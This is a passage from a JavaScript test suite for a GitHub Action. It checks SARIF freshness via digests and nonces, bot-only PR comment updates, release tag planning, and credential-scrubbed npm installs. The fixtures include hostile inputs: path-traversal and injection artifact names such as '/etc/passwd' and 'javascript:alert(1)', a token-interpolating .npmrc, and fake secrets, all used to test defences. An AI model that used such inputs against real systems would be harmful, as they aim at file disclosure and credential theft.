            GETADVANTAGE_WORKSPACE: repo,
          }),
        });
        assert.equal(code, 1, "pull_request_target must exit 1");
        assert.ok(!existsSync(ranFlag), "must not spawn the CLI child on pull_request_target");
        const outs = readFileSync(outFile, "utf8");
        assert.ok(/verdict=ERROR/.test(outs), outs);
        assert.ok(/exit-code=1/.test(outs), outs);
        assert.ok(/sarif-written=false/.test(outs), outs);
        assert.ok(/sarif-upload-eligible=false/.test(outs), outs);
        assert.ok(/summary-mode=none/.test(outs), outs);
        assert.ok(/sarif-path=$/m.test(outs) || /sarif-path=\s*$/m.test(outs), outs);
      } finally {
        process.chdir(prev);
      }
    } finally {
      cleanup(base);
    }
  }

  // --- 2. SARIF content identity: same-size rewrite + preserved mtime ---
  {
    const base = freshBase();
    try {
      const p = path.join(base, "same-size.sarif");
      // Two valid SARIF docs, identical byte length, different content.
      const a =
        '{"version":"2.1.0","runs":[{"tool":{"driver":{"name":"AAAA"}}}]}\n';
      const b =
        '{"version":"2.1.0","runs":[{"tool":{"driver":{"name":"BBBB"}}}]}\n';
      assert.equal(a.length, b.length, "fixture must be same size");
      writeFileSync(p, a, "utf8");
      const before = fileSnapshot(p);
      assert.ok(before && before.sha256);
      // Preserve mtime after rewrite (simulates mtime collision / touch -r).
      // Platforms may truncate sub-ms precision; digest must still prove the change.
      writeFileSync(p, b, "utf8");
      const past = new Date(Math.floor(before.mtimeMs));
      utimesSync(p, past, past);
      const afterSnap = fileSnapshot(p);
      assert.equal(afterSnap.size, before.size, "same-size rewrite fixture");
      // mtime intentionally restored to (approx) the pre value — size alone cannot distinguish.
      assert.ok(
        Math.abs(afterSnap.mtimeMs - before.mtimeMs) < 2000,
        `mtime should be restored near pre value (got ${afterSnap.mtimeMs} vs ${before.mtimeMs})`,
      );
      assert.notEqual(afterSnap.sha256, before.sha256, "content digest must change");
      assert.equal(isCurrentSarifWrite(p, before), true, "digest change must count as current write");

      // Unchanged content → not a current write (stale must never upload).
      writeFileSync(p, a, "utf8");
      const staleBefore = fileSnapshot(p);
      // "Rewrite" identical bytes (size+mtime may look current; digest is identical).
      writeFileSync(p, a, "utf8");
      utimesSync(p, new Date(Math.floor(staleBefore.mtimeMs)), new Date(Math.floor(staleBefore.mtimeMs)));
      assert.equal(isCurrentSarifWrite(p, staleBefore), false, "identical content must not be claimed as written");

      // Invalid SARIF (wrong version) never counts even if new.
      const bad = path.join(base, "bad.sarif");
      writeFileSync(bad, '{"version":"1.0.0","runs":[]}\n', "utf8");
      assert.equal(isCurrentSarifWrite(bad, null), false);
      // Missing runs array
      writeFileSync(bad, '{"version":"2.1.0"}\n', "utf8");
      assert.equal(isCurrentSarifWrite(bad, null), false);
    } finally {
      cleanup(base);
    }
  }

  // Stale via runAction + fake CLI that rewrites same-size different content vs unchanged
  {
    const base = freshBase();
    try {
      const repo = path.join(base, "digest-stale");
      initRepo(repo);
      write(repo, "package.json", '{"name":"digest-stale","version":"1.0.0"}\n');
      // Pre-existing valid SARIF — fake CLI never rewrites it.
      const staleBody =
        '{"version":"2.1.0","runs":[{"tool":{"driver":{"name":"STALE"}}}]}\n';
      write(repo, "out.sarif", staleBody);
      const fakeRoot = path.join(base, "fake-no-write");
      mkdirSync(fakeRoot, { recursive: true });
      writeFileSync(
        path.join(fakeRoot, "index.mjs"),
        `console.log(JSON.stringify({verdict:"NO-GO",exitCode:1,checks:[]})); process.exit(1);\n`,
        "utf8",
      );
      const outFile = path.join(base, "out-digest.txt");
      writeFileSync(outFile, "", "utf8");
      const prev = process.cwd();
      process.chdir(repo);
      try {
        const code = await runAction({
          ...buildEnv({
            GETADVANTAGE_ACTION_PATH: fakeRoot,
            INPUT_SARIF_FILE: "out.sarif",
            INPUT_COMMENT: "false",
            INPUT_REPORT: "false",
            GITHUB_OUTPUT: outFile,
            GITHUB_EVENT_NAME: "push",
            GETADVANTAGE_WORKSPACE: repo,
          }),
        });
        assert.equal(code, 1);
        const outs = readFileSync(outFile, "utf8");
        assert.ok(/sarif-written=false/.test(outs), outs);
        assert.ok(/sarif-upload-eligible=false/.test(outs), outs);
      } finally {
        process.chdir(prev);
      }

      // Same-size content replace by fake CLI → must set sarif-written=true
      // when the trusted nonce is bound (Action parent passes GETADVANTAGE_SARIF_RUN_NONCE).
      const sameA =
        '{"version":"2.1.0","runs":[{"tool":{"driver":{"name":"OLDX"}},"properties":{"getadvantage/runNonce":"stale"}}]}\n';
      write(repo, "swap.sarif", sameA);
      const fakeWrite = path.join(base, "fake-write");
      mkdirSync(fakeWrite, { recursive: true });
      writeFileSync(
        path.join(fakeWrite, "index.mjs"),
        `import { writeFileSync } from "node:fs";
const nonce = process.env.GETADVANTAGE_SARIF_RUN_NONCE || "";
const body =
  JSON.stringify({
    version: "2.1.0",
    runs: [{
      tool: { driver: { name: "NEWY" } },
      properties: { "getadvantage/runNonce": nonce },
    }],
  }) + "\\n";
// Content digest + nonce prove this run; mtime may collide.
writeFileSync("swap.sarif", body);
console.log(JSON.stringify({verdict:"GO",exitCode:0,checks:[]}));
process.exit(0);
`,
        "utf8",
      );
      const out2 = path.join(base, "out-swap.txt");
      writeFileSync(out2, "", "utf8");
      process.chdir(repo);
      try {
        // Freeze mtime of pre-file so only digest proves the change after write.
        const prePath = path.join(repo, "swap.sarif");
        const frozen = new Date("2020-01-01T00:00:00Z");
        utimesSync(prePath, frozen, frozen);
        const code2 = await runAction({
          ...buildEnv({
            GETADVANTAGE_ACTION_PATH: fakeWrite,
            INPUT_SARIF_FILE: "swap.sarif",
            INPUT_COMMENT: "false",
            INPUT_REPORT: "false",
            GITHUB_OUTPUT: out2,
            GITHUB_EVENT_NAME: "push",
            GETADVANTAGE_WORKSPACE: repo,
          }),
        });
        // After write, restore mtime to frozen so size+mtime would match pre if
        // content were ignored — but content changed so digest must win.
        utimesSync(prePath, frozen, frozen);
        // Unit path: digest change without nonce still counts when expectedNonce omitted.
        const unitA =
          '{"version":"2.1.0","runs":[{"tool":{"driver":{"name":"AAAA"}}}]}\n';
        const unitB =
          '{"version":"2.1.0","runs":[{"tool":{"driver":{"name":"BBBB"}}}]}\n';
        assert.equal(unitA.length, unitB.length);
        writeFileSync(prePath, unitA, "utf8");
        utimesSync(prePath, frozen, frozen);
        const snapA = fileSnapshot(prePath);
        writeFileSync(prePath, unitB, "utf8");
        utimesSync(prePath, frozen, frozen);
        assert.equal(isCurrentSarifWrite(prePath, snapA), true);
        // With expectedNonce, missing/wrong nonce must not count even if content changed.
        assert.equal(isCurrentSarifWrite(prePath, snapA, { expectedNonce: "need-me" }), false);
        writeFileSync(
          prePath,
          JSON.stringify({
            version: "2.1.0",
            runs: [{ tool: { driver: { name: "BBBB" } }, properties: { "getadvantage/runNonce": "need-me" } }],
          }) + "\n",
          "utf8",
        );
        assert.equal(isCurrentSarifWrite(prePath, snapA, { expectedNonce: "need-me" }), true);
        const outs2 = readFileSync(out2, "utf8");
        // The runAction path saw a real content change with bound nonce.
        assert.ok(/sarif-written=true/.test(outs2), outs2);
        assert.equal(code2, 0);
      } finally {
        process.chdir(prev);
      }
    } finally {
      cleanup(base);
    }
  }

  // --- 3. Human actor + unrelated bot markers must never be PATCHed; authenticated bot on page 2 is ---
  {
    assert.equal(isVerifiedBotLogin("attacker"), false);
    assert.equal(isVerifiedBotLogin("github-actions[bot]"), true);
    assert.equal(isVerifiedBotLogin("my-app[bot]"), false, "arbitrary [bot] is not a verified Actions login");
    assert.equal(
      isBotOwnedMarkerComment(
        { id: 1, body: PR_SUMMARY_MARKER + "\nhijack", user: { login: "attacker", type: "User" } },
        "attacker",
      ),
      false,
      "human GITHUB_ACTOR match must never authorize ownership",
    );
    assert.equal(
      isBotOwnedMarkerComment(
        { id: 2, body: PR_SUMMARY_MARKER + "\nother", user: { login: "dependabot[bot]", type: "Bot" } },
        "github-actions[bot]",
      ),
      false,
      "unrelated bot marker must never authorize ownership",
    );

    const bot = { login: "github-actions[bot]", type: "Bot" };
    const attacker = { login: "attacker", type: "User" };
    const unrelatedBot = { login: "dependabot[bot]", type: "Bot" };
    const store = { comments: [], posts: 0, patches: 0, patchedIds: [], userCalls: 0 };
    // Page 1: human spoof + unrelated bot spoof. Page 2: genuine authenticated bot marker.
    store.comments.push({
      id: 1,
      body: PR_SUMMARY_MARKER + "\n### getAdvantage check\n\n**GO** · attacker hijack\n",
      user: attacker,
    });
    store.comments.push({
      id: 2,
      body: PR_SUMMARY_MARKER + "\n### getAdvantage check\n\n**GO** · dependabot spoof\n",
      user: unrelatedBot,
    });
    // Fill rest of page 1 so bot marker is on page 2
    for (let i = 0; i < COMMENT_PAGE_SIZE - 2; i++) {
      store.comments.push({ id: 10 + i, body: `noise ${i}`, user: { login: "human", type: "User" } });
    }
    const botMarkerId = 7777;
    store.comments.push({
      id: botMarkerId,
      body: PR_SUMMARY_MARKER + "\n### getAdvantage check\n\n**GO**\n",
      user: bot,
    });

    const fetchImpl = async (url, init = {}) => {
      const method = (init.method || "GET").toUpperCase();
      if (method === "GET" && /\/user$/.test(url)) {
        store.userCalls += 1;
        // Authenticated token is the Actions bot — not GITHUB_ACTOR=attacker.
        return { ok: true, status: 200, json: async () => ({ login: bot.login, type: "Bot" }) };
      }
      if (method === "GET" && /\/comments\?/.test(url)) {
        const u = new URL(url, "https://api.github.com");
        const page = Number(u.searchParams.get("page") || "1");
        const per = Number(u.searchParams.get("per_page") || String(COMMENT_PAGE_SIZE));
        const start = (page - 1) * per;
        return { ok: true, status: 200, json: async () => store.comments.slice(start, start + per) };
      }
      if (method === "PATCH" && /\/comments\/(\d+)$/.test(url)) {
        store.patches += 1;
        const id = Number(url.match(/\/comments\/(\d+)$/)[1]);
        store.patchedIds.push(id);
        const body = JSON.parse(init.body).body;
        const idx = store.comments.findIndex((c) => c.id === id);
        if (idx >= 0) store.comments[idx] = { ...store.comments[idx], body };
        return { ok: true, status: 200, json: async () => ({ id, body }) };
      }
      if (method === "POST") {
        store.posts += 1;
        return { ok: true, status: 201, json: async () => ({ id: 999 }) };
      }
      return { ok: false, status: 500, json: async () => ({}) };
    };

    const body = buildSummaryMarkdown({ verdict: "NO-GO", exitCode: 1, checks: [], version: "0.9.0" });
    // Hostile: pass actorLogin=attacker as a confused caller might (GITHUB_ACTOR).
    // Implementation must still resolve /user and only PATCH the bot marker.
    const up = await upsertPrComment({
      token: "ghs_" + "G".repeat(36),
      owner: "o",
      repo: "r",
      issueNumber: 55,
      body,
      actorLogin: "attacker", // must be ignored (not a verified bot login)
      fetchImpl,
    });
    assert.equal(up.ok, true);
    assert.equal(up.action, "updated");
    assert.equal(up.id, botMarkerId, "must update genuine authenticated bot marker on later page");
    assert.equal(store.patches, 1);
    assert.deepEqual(store.patchedIds, [botMarkerId]);
    assert.equal(store.posts, 0, "must not POST when bot marker exists");
    assert.ok(store.userCalls >= 1, "must resolve token identity via /user");
    assert.ok(store.comments.find((c) => c.id === 1).body.includes("attacker hijack"), "attacker comment untouched");
    assert.ok(
      store.comments.find((c) => c.id === 2).body.includes("dependabot spoof"),
      "unrelated bot comment untouched",
    );
  }

  // --- 4. Pagination cap: every page full → truncated, no POST ---
  {
    const store = { comments: [], posts: 0, patches: 0, listPages: [] };
    // Exactly COMMENT_PAGE_CAP full pages of non-marker noise (no bot marker).
    const total = COMMENT_PAGE_SIZE * COMMENT_PAGE_CAP;
    for (let i = 0; i < total; i++) {
      store.comments.push({
        id: 5000 + i,
        body: i === 0 ? "human " + PR_SUMMARY_MARKER + " spoof" : `noise ${i}`,
        user: { login: "human", type: "User" },
      });
    }
    const fetchCap = async (url, init = {}) => {
      const method = (init.method || "GET").toUpperCase();
      if (method === "GET" && /\/user$/.test(url)) {
        return { ok: true, status: 200, json: async () => ({ login: "github-actions[bot]", type: "Bot" }) };
      }
      if (method === "GET" && /\/comments\?/.test(url)) {
        const u = new URL(url, "https://api.github.com");
        const page = Number(u.searchParams.get("page") || "1");
        store.listPages.push(page);
        const per = Number(u.searchParams.get("per_page") || String(COMMENT_PAGE_SIZE));
        const start = (page - 1) * per;
        return { ok: true, status: 200, json: async () => store.comments.slice(start, start + per) };
      }
      if (method === "POST") {
        store.posts += 1;
        return { ok: true, status: 201, json: async () => ({ id: 1 }) };
      }
      if (method === "PATCH") {
        store.patches += 1;
        return { ok: true, status: 200, json: async () => ({ id: 1 }) };
      }
      return { ok: false, status: 500, json: async () => ({}) };
    };
    const body = buildSummaryMarkdown({ verdict: "GO", exitCode: 0, checks: [] });
    const up = await upsertPrComment({
      token: "ghs_" + "H".repeat(36),
      owner: "o",
      repo: "r",
      issueNumber: 88,
      body,
      fetchImpl: fetchCap,
    });
    assert.equal(up.ok, false, "truncated lookup must not create a comment");
    assert.ok(/list-truncated/.test(up.reason), up.reason);
    assert.equal(store.posts, 0, "must not POST after pagination cap with full pages");
    assert.equal(store.patches, 0);
    assert.equal(store.listPages.length, COMMENT_PAGE_CAP);
  }

  // --- 5. Action release contract (static + pure plan unit tests; no network) ---
  {
    assert.equal(parsePackageVersion("0.9.0").ok, true);
    assert.equal(exactTagName("0.9.0"), "v0.9.0");
    assert.equal(actionMajorTagForVersion("0.9.0"), "v1");
    assert.equal(ACTION_MAJOR_TAG, "v1");

    const createRef = githubRefApiRequest({
      repository: "BellmeJoe/getadvantage-cli",
      tag: "v0.9.1",
      sha: "a".repeat(40),
    });
    assert.equal(createRef.ok, true);
    assert.deepEqual(createRef.args.slice(0, 4), ["api", "--method", "POST", "repos/BellmeJoe/getadvantage-cli/git/refs"]);
    assert.ok(createRef.args.includes("ref=refs/tags/v0.9.1"));

    const moveRef = githubRefApiRequest({
      repository: "BellmeJoe/getadvantage-cli",
      tag: "v1",
      sha: "b".repeat(40),
      force: true,
    });
    assert.equal(moveRef.ok, true);
    assert.deepEqual(moveRef.args.slice(0, 4), ["api", "--method", "PATCH", "repos/BellmeJoe/getadvantage-cli/git/refs/tags/v1"]);
    assert.ok(moveRef.args.includes("force=true"));
    assert.equal(githubRefApiRequest({ repository: "bad", tag: "v1", sha: "a".repeat(40) }).ok, false);

    const head = "a".repeat(40);
    const other = "b".repeat(40);

    // Fresh release: create exact tag, move v1, create release
    const fresh = planActionRelease({
      version: "0.9.0",
      headSha: head,
      existingTags: [],
      releaseExists: false,
    });
    assert.equal(fresh.ok, true);
    assert.equal(fresh.idempotent, false);
    assert.ok(fresh.ops.some((o) => o.op === "create-tag" && o.tag === "v0.9.0"));
    assert.ok(fresh.ops.some((o) => o.op === "move-tag" && o.tag === "v1" && o.sha === head));
    assert.ok(fresh.ops.some((o) => o.op === "create-release" && o.tag === "v0.9.0"));

    // Idempotent rerun: everything already correct
    const idemp = planActionRelease({
      version: "0.9.0",
      headSha: head,
      existingTags: [
        { name: "v0.9.0", sha: head },
        { name: "v1", sha: head },
      ],
      releaseExists: true,
    });
    assert.equal(idemp.ok, true);
    assert.equal(idemp.idempotent, true);
    assert.ok(idemp.ops.every((o) => o.op === "keep-tag" || o.op === "keep-release"));

    // Source/tag mismatch: exact tag points elsewhere → hard fail
    const mismatch = planActionRelease({
      version: "0.9.0",
      headSha: head,
      existingTags: [{ name: "v0.9.0", sha: other }],
      releaseExists: false,
    });
    assert.equal(mismatch.ok, false);
    assert.equal(mismatch.reason, "source-tag-mismatch");

    // v1 on old commit → move-tag
    const moveV1 = planActionRelease({
      version: "0.9.1",
      headSha: head,
      existingTags: [
        { name: "v0.9.1", sha: head },
        { name: "v1", sha: other },
      ],
      releaseExists: true,
    });
    assert.equal(moveV1.ok, true);
    assert.ok(moveV1.ops.some((o) => o.op === "move-tag" && o.tag === "v1"));

    // publish.yml contract
    const ymlPath = path.join(__dirname, "..", ".github", "workflows", "publish.yml");
    assert.ok(existsSync(ymlPath), "publish.yml must exist");
    const yml = readFileSync(ymlPath, "utf8");
    const contract = validatePublishWorkflowContract(yml);
    assert.equal(contract.ok, true, contract.failures.join("; "));
    assert.ok(/ops\/action-release\.mjs/.test(yml), "workflow must invoke action-release.mjs");
    assert.ok(/contents:\s*write/.test(yml));
    assert.ok(!/permissions:\s*write-all/i.test(yml));
    assert.ok(/npm test/.test(yml));
    assert.ok(/npm run evidence/.test(yml));
    // Behavioral: plan + workflow share the same exact/major tag names
    assert.ok(yml.includes("v1") || yml.includes("floating"));
  }

  // --- 6. Install is behind trusted scrubbed Node boundary (not raw shell npm) ---
  {
    const yml = readFileSync(path.join(__dirname, "..", "action.yml"), "utf8");
    assert.ok(/action\/install\.mjs/.test(yml), "install must run via trusted install.mjs");
    assert.ok(!/if \[ -f package-lock\.json \]; then npm ci/.test(yml), "must not shell-out npm with inherited env");
    const {
      planProjectInstall,
      runProjectInstall,
    } = await import(pathToFileURL(path.join(__dirname, "..", "action", "install.mjs")).href);
    const base = freshBase();
    try {
      const withLock = path.join(base, "with-lock");
      mkdirSync(withLock, { recursive: true });
      writeFileSync(path.join(withLock, "package.json"), '{"name":"x","version":"1.0.0"}\n');
      writeFileSync(path.join(withLock, "package-lock.json"), '{"lockfileVersion":3,"packages":{}}\n');
      assert.equal(planProjectInstall(withLock).mode, "ci");
      assert.deepEqual(planProjectInstall(withLock).args, ["ci", "--ignore-scripts"]);
      const noLock = path.join(base, "no-lock");
      mkdirSync(noLock, { recursive: true });
      writeFileSync(path.join(noLock, "package.json"), '{"name":"y","version":"1.0.0"}\n');
      assert.equal(planProjectInstall(noLock).mode, "install-no-lock");
      assert.ok(planProjectInstall(noLock).args.includes("--no-package-lock"));
      assert.ok(planProjectInstall(noLock).args.includes("--ignore-scripts"));
      const empty = path.join(base, "empty");
      mkdirSync(empty, { recursive: true });
      assert.equal(planProjectInstall(empty).skip, true);

      // Hostile .npmrc + env: installer child must not see secrets.
      const hostile = path.join(base, "hostile-npm");
      mkdirSync(hostile, { recursive: true });
      writeFileSync(
        path.join(hostile, "package.json"),
        '{"name":"hostile-npm","version":"1.0.0"}\n',
      );
      // .npmrc that would interpolate env if present in the child.
      writeFileSync(
        path.join(hostile, ".npmrc"),
        "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n//npm.pkg.github.com/:_authToken=${GITHUB_TOKEN}\n",
      );
      const seenEnvPath = path.join(base, "installer-env.json");
      const captured = { args: null, env: null };
      const fakeSpawn = (cmd, args, opts) => {
        captured.args = args;
        captured.env = opts.env || {};
        writeFileSync(seenEnvPath, JSON.stringify(opts.env || {}), "utf8");
        return { status: 0, stdout: "ok\n", stderr: "", error: null };
      };
      const dirtyEnv = {
        PATH: process.env.PATH || "",
        GITHUB_TOKEN: "ghs_" + "INSTALLLEAK".repeat(4),
        GH_TOKEN: "ghp_" + "INSTALLLEAK".repeat(4),
        ACTIONS_ID_TOKEN_REQUEST_TOKEN: "oidc-install-secret-xx",
        ACTIONS_ID_TOKEN_REQUEST_URL: "https://example.test/oidc",
        ACTIONS_RUNTIME_TOKEN: "runtime-install-secret-xx",
        GETADVANTAGE_API_KEY: "adv_live_" + "installleak000001",
        NPM_TOKEN: "npm_" + "installleak00000001",
        NODE_AUTH_TOKEN: "npm_" + "installleak00000002",
        AWS_SECRET_ACCESS_KEY: "awsinstallsecret0001",
        SAFE_FLAG: "keep-me",
      };
      const r = runProjectInstall({ cwd: hostile, env: dirtyEnv, spawnSyncImpl: fakeSpawn });
      assert.equal(r.ok, true);
      assert.equal(r.mode, "install-no-lock");
      assert.ok(captured.args.includes("--ignore-scripts"));
      assert.ok(captured.args.includes("--no-package-lock"));
      const childEnv = captured.env;
      assert.equal(childEnv.SAFE_FLAG, "keep-me");
      for (const k of [
        "GITHUB_TOKEN",
        "GH_TOKEN",
        "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
        "ACTIONS_ID_TOKEN_REQUEST_URL",
        "ACTIONS_RUNTIME_TOKEN",
        "GETADVANTAGE_API_KEY",
        "NPM_TOKEN",
        "NODE_AUTH_TOKEN",
        "AWS_SECRET_ACCESS_KEY",
      ]) {
        assert.equal(childEnv[k], undefined, `installer must not see ${k}`);
      }
      // Also prove the env blob written for the child has no secret material.
      const envBlob = readFileSync(seenEnvPath, "utf8");
      assert.ok(!envBlob.includes("INSTALLLEAK"), "scrubbed env must not contain fixture secrets");
      assert.ok(!envBlob.includes("installleak"), "scrubbed env must not contain fixture secrets");
      assert.ok(!envBlob.includes("oidc-install-secret"), envBlob);
      assert.ok(!existsSync(path.join(hostile, "package-lock.json")), "must not create lockfile when none existed");
    } finally {
      cleanup(base);
    }
  }
});

scenario("action repair pass-3: encodeArtifactUri hostiles, nonce scrub, install packing", async () => {
  const { encodeArtifactUri, buildSarif } = await import(
    pathToFileURL(path.join(__dirname, "..", "sarif.mjs")).href
  );
  const { scrubCredentialEnv, isCredentialEnvKey } = await import(
    pathToFileURL(path.join(__dirname, "..", "util.mjs")).href
  );
  const { buildCliChildEnv, isCurrentSarifWrite, fileSnapshot } = await import(
    pathToFileURL(path.join(__dirname, "..", "action", "main.mjs")).href
  );

  // encodeArtifactUri: omit controls, absolutes, URL-like, . / .. escapes
  assert.equal(encodeArtifactUri("src/app.js"), "src/app.js");
  assert.equal(encodeArtifactUri("src/my file.js"), "src/my%20file.js");
  assert.equal(encodeArtifactUri("a\u0000b.js"), "");
  assert.equal(encodeArtifactUri("evil\nname.js"), "");
  assert.equal(encodeArtifactUri("/etc/passwd"), "");
  assert.equal(encodeArtifactUri("C:\\Windows\\system32\\x.js"), "");
  assert.equal(encodeArtifactUri("\\\\server\\share\\x.js"), "");
  assert.equal(encodeArtifactUri("https://evil.test/x.js"), "");
  assert.equal(encodeArtifactUri("file:///tmp/x"), "");
  assert.equal(encodeArtifactUri("javascript:alert(1)"), "");
  assert.equal(encodeArtifactUri("../outside.js"), "");
  assert.equal(encodeArtifactUri("foo/../bar.js"), "");
  assert.equal(encodeArtifactUri("./sneaky.js"), "");
  assert.equal(encodeArtifactUri("foo/./bar.js"), "");
  assert.equal(encodeArtifactUri("sk_live_" + "URISECRET0000000000001.js"), "");

  // Nonce: trusted CLI keeps it; scrub drops it from project-controlled env
  assert.equal(isCredentialEnvKey("GETADVANTAGE_SARIF_RUN_NONCE"), true);
  const nonce = "a".repeat(32);
  const cliEnv = buildCliChildEnv(
    {
      PATH: process.env.PATH || "",
      GITHUB_TOKEN: "ghs_" + "X".repeat(36),
      GETADVANTAGE_SARIF_RUN_NONCE: "should-be-replaced",
    },
    { wantReport: false, sarifNonce: nonce },
  );
  assert.equal(cliEnv.GETADVANTAGE_SARIF_RUN_NONCE, nonce);
  assert.equal(cliEnv.GITHUB_TOKEN, undefined);
  const projectEnv = scrubCredentialEnv({
    PATH: process.env.PATH || "",
    GETADVANTAGE_SARIF_RUN_NONCE: nonce,
    GITHUB_TOKEN: "ghs_" + "Y".repeat(36),
    SAFE: "1",
  });
  assert.equal(projectEnv.GETADVANTAGE_SARIF_RUN_NONCE, undefined);
  assert.equal(projectEnv.GITHUB_TOKEN, undefined);
  assert.equal(projectEnv.SAFE, "1");

  // buildSarif binds nonce from env when Action spawns CLI
  const prevNonce = process.env.GETADVANTAGE_SARIF_RUN_NONCE;
  try {
    process.env.GETADVANTAGE_SARIF_RUN_NONCE = "bound-nonce-fixture-001";
    const doc = buildSarif({ results: [], exitCode: 0 });
    assert.equal(doc.runs[0].properties["getadvantage/runNonce"], "bound-nonce-fixture-001");
  } finally {
    if (prevNonce === undefined) delete process.env.GETADVANTAGE_SARIF_RUN_NONCE;
    else process.env.GETADVANTAGE_SARIF_RUN_NONCE = prevNonce;
  }

  // Stale file replaced by repo child without nonce never counts as this run's SARIF
  const base = freshBase();
  try {
    const p = path.join(base, "stale-nonce.sarif");
    const beforeBody = JSON.stringify({
      version: "2.1.0",
      runs: [{ tool: { driver: { name: "STALE" } }, properties: { "getadvantage/runNonce": "old" } }],
    });
    writeFileSync(p, beforeBody, "utf8");
    const before = fileSnapshot(p);
    // Hostile child rewrites with valid SARIF but wrong/missing nonce
    writeFileSync(
      p,
      JSON.stringify({
        version: "2.1.0",
        runs: [{ tool: { driver: { name: "HOSTILE" } } }],
      }),
      "utf8",
    );
    assert.equal(isCurrentSarifWrite(p, before, { expectedNonce: "this-run-only" }), false);
    writeFileSync(
      p,
      JSON.stringify({
        version: "2.1.0",
        runs: [{ tool: { driver: { name: "HOSTILE" } }, properties: { "getadvantage/runNonce": "wrong" } }],
      }),
      "utf8",
    );
    assert.equal(isCurrentSarifWrite(p, before, { expectedNonce: "this-run-only" }), false);
    writeFileSync(
      p,
      JSON.stringify({
        version: "2.1.0",
        runs: [
          { tool: { driver: { name: "TRUSTED" } }, properties: { "getadvantage/runNonce": "this-run-only" } },
        ],
      }),
      "utf8",
    );
    assert.equal(isCurrentSarifWrite(p, before, { expectedNonce: "this-run-only" }), true);
  } finally {
    cleanup(base);
  }

  // publish.yml runner gate contract already validated in pass-2; re-check uses: ./
  const yml = readFileSync(path.join(__dirname, "..", ".github", "workflows", "publish.yml"), "utf8");
  assert.ok(/^\s*uses:\s*\.\/\s*$/m.test(yml), "publish must execute uses: ./");
  assert.ok(/comment:\s*false/.test(yml));
  assert.ok(/report:\s*false/.test(yml));
  assert.ok(/working-directory:\s*fixtures\/publish-self-gate/.test(yml), "self-gate must target clean fixture");
  const usesIdx = yml.search(/^\s*uses:\s*\.\/\s*$/m);
  const pubIdx = yml.search(/^\s*npm publish\b/m);
  assert.ok(usesIdx >= 0 && pubIdx > usesIdx, "uses: ./ must precede npm publish");
});

scenario("action repair pass-4: published source identity, annotated peel, pre-tag gitHead verify", async () => {
  const {
    planActionRelease,
    planPublishGate,
    resolveReleasedSourceSha,
    verifyPublishedNpmSource,
    peelTagToCommit,
    waitForNpmGitHead,
    validatePublishWorkflowContract,
    shasEqual,
    normalizeSha,
    exactTagName,
    ACTION_MAJOR_TAG,
  } = await import(pathToFileURL(path.join(__dirname, "..", "ops", "action-release.mjs")).href);

  const releaseSha = "a".repeat(40);
  const docsSha = "b".repeat(40);
  const otherSha = "c".repeat(40);

  // --- 1. Docs-only push: HEAD ≠ published source; tags already correct → no-op ---
  {
    const gate = planPublishGate({
      localVersion: "0.9.0",
      publishedVersion: "0.9.0",
      candidateHeadSha: docsSha,
      npmGitHead: releaseSha,
      exactTagCommitSha: releaseSha,
      majorTagCommitSha: releaseSha,
      releaseExists: true,
    });
    assert.equal(gate.ok, true, gate.reason);
    assert.equal(gate.newPublish, false);
    assert.equal(gate.tagsMissing, false, "docs-only must not claim tags missing when distribution matches published source");
    assert.equal(gate.idempotentNoOp, true);
    assert.equal(gate.sourceSha, releaseSha);
    assert.equal(gate.sourceOrigin, "npm-gitHead");
    assert.ok(!shasEqual(gate.sourceSha, docsSha), "source must not be docs HEAD");
  }

  // --- 2. Docs-only + v1 drifted to docs HEAD → repair to released source, not docs ---
  {
    const gate = planPublishGate({
      localVersion: "0.9.0",
      publishedVersion: "0.9.0",
      candidateHeadSha: docsSha,
      npmGitHead: releaseSha,
      exactTagCommitSha: releaseSha,
      majorTagCommitSha: docsSha, // wrongly moved to docs-only commit
      releaseExists: true,
    });
    assert.equal(gate.ok, true);
    assert.equal(gate.tagsMissing, true);
    assert.equal(gate.sourceSha, releaseSha, "repair identity is npm gitHead");
    const plan = planActionRelease({
      version: "0.9.0",
      headSha: gate.sourceSha,
      existingTags: [
        { name: "v0.9.0", sha: releaseSha },
        { name: "v1", sha: docsSha },
      ],
      releaseExists: true,
    });
    assert.equal(plan.ok, true);
    const move = plan.ops.find((o) => o.op === "move-tag" && o.tag === "v1");
    assert.ok(move, "must move floating major");
    assert.equal(move.sha, releaseSha, "must never retag v1 to docs-only SHA");
    assert.ok(plan.ops.every((o) => o.sha == null || o.sha === releaseSha || o.op.startsWith("keep")));
  }

  // --- 3. Unproven published source → fail safely (no blind HEAD) ---
  {
    const unproven = resolveReleasedSourceSha({
      alreadyPublished: true,
      candidateHeadSha: docsSha,
      npmGitHead: null,
      exactTagCommitSha: null,
    });
    assert.equal(unproven.ok, false);
    assert.equal(unproven.reason, "published-source-unproven");

    const gate = planPublishGate({
      localVersion: "0.9.0",
      publishedVersion: "0.9.0",
      candidateHeadSha: docsSha,
      npmGitHead: null,
      exactTagCommitSha: null,
      majorTagCommitSha: null,
      releaseExists: false,
    });
    assert.equal(gate.ok, false);
    assert.equal(gate.reason, "published-source-unproven");
  }

  // --- 4. npm gitHead vs exact tag conflict → fail ---
  {
    const conflict = resolveReleasedSourceSha({
      alreadyPublished: true,
      npmGitHead: releaseSha,
      exactTagCommitSha: otherSha,
    });
    assert.equal(conflict.ok, false);
    assert.equal(conflict.reason, "published-source-conflict");
  }

  // --- 5. New publish uses candidate HEAD; post-publish gitHead must match ---
  {
    const resolved = resolveReleasedSourceSha({
      alreadyPublished: false,
      candidateHeadSha: releaseSha,
    });
    assert.equal(resolved.ok, true);
    assert.equal(resolved.origin, "candidate-head");
    assert.equal(resolved.sourceSha, releaseSha);

    const ok = verifyPublishedNpmSource({
      candidateHeadSha: releaseSha,
      npmGitHead: releaseSha,
    });
    assert.equal(ok.ok, true);
    assert.equal(ok.sourceSha, releaseSha);

    const mismatch = verifyPublishedNpmSource({
      candidateHeadSha: releaseSha,
      npmGitHead: docsSha,
    });
    assert.equal(mismatch.ok, false);
    assert.equal(mismatch.reason, "npm-gitHead-mismatch");

    const missing = verifyPublishedNpmSource({
      candidateHeadSha: releaseSha,
      npmGitHead: null,
    });
    assert.equal(missing.ok, false);
    assert.equal(missing.reason, "npm-gitHead-unobserved");

    // Bounded retry: first empty, then match — tags would only run after ok.
    let calls = 0;
    const waited = waitForNpmGitHead(
      { name: "getadvantage", version: "0.9.0", candidateHeadSha: releaseSha, attempts: 3, delayMs: 0 },
      {
        npmView: () => {
          calls += 1;
          return calls < 2 ? "" : releaseSha;
        },
        sleep: () => {},
      },
    );
    assert.equal(waited.ok, true);
